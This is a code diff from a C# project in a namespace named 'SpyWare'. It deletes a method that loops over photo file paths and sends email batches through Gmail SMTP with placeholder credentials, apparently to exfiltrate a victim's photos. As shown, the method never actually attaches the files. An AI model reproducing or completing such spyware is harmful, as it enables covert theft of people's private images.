@@ -122,32 +122,7 @@ namespace SpyWare
         public static MailAddress to = new MailAddress("To@gmail.com");
         public static MailMessage message;
         public static SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
-        public static void SendMessage(object PhotoFiles)
-        {
-            while (true)
-            {
-                CancellationTokenSource source = new CancellationTokenSource();
-                Stack<string> Files = (Stack<string>)PhotoFiles;
-                if (Files.Count > 10)
-                {
-                    int AttachFiles = 0;
-                    message = new MailMessage(from, to);
-                    while (AttachFiles != 10 && Files.Count > 0)
-                    {
-                        Files.Pop();
-                        Console.WriteLine("К-ство файлов в списке" + Files.Count);
-                        Console.WriteLine("Удалено с стека");
-                        AttachFiles++;
-                    }
-                    smtp.Credentials = new NetworkCredential("from@gmail.com", "fromParolb");
-                    smtp.EnableSsl = true;
-                    Task task = smtp.SendMailAsync(message);
-                    task.Wait(1000, source.Token);
-                    Console.WriteLine(task.Status + "Статус отправки смс");
-                    if (task.Status == TaskStatus.Running) source.Cancel();
-                }
-            }
-        }
+        
     }
 }
 
